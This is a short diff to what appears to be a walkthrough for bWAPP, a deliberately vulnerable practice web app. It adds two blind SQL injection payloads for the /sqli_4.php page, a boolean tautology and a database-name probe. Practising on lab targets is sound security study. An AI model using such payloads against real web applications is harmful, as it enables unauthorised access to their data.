@@ -279,6 +279,12 @@ Parameter: XML (generic) login ((custom) POST)
 ```
 ### 💀  SQL Injection - Blind - Boolean-Based 💀
 url /sqli_4.php
+```
+x' OR '1'='1
+```
+```
+x' OR (select database()='bWAPP') AND '1'='1
+```
 
 ### 💀  SQL Injection - Stored (Blog) 💀
 
